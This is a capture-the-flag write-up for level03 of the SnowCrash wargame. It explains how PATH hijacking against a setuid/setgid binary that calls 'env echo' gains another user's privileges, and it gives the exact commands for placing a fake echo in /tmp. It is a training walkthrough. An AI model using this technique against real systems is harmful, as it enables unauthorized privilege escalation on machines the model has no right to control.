## level03

1. Check files in current working directory (home dir)
    - `-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*`

```bash
level03@SnowCrash:~$ ./level03 
Exploit me
level03@SnowCrash:~$
```

Using `nm` to retrieve the binary's symbols reveals a usage of `system`, and no other functions that writes something to `stdout` / `stderr`, so the call to `system` must be calling a binary such as `echo`

And indeed, if we use `strings` we can see this : `/usr/bin/env echo Exploit me`. We will have to trick the program into executing our own `echo` command that will execute the `getflag` command.

This works because the binary has both `setuid` &  `setgid` flags set. This means that even if we (`level03`) executes the binary `level03`, the binary will have the permissions of `flag03`.

We can use these shell commands to 'exploit' the binary :

```
export PATH=/tmp:$PATH
(echo "/bin/bash -c 'getflag'" > /tmp/echo) && chmod +x /tmp/echo && ./level03
```

Since `/usr/bin/env` reads the `PATH` variable left to right, our custom `echo` will be executed instead of the real one.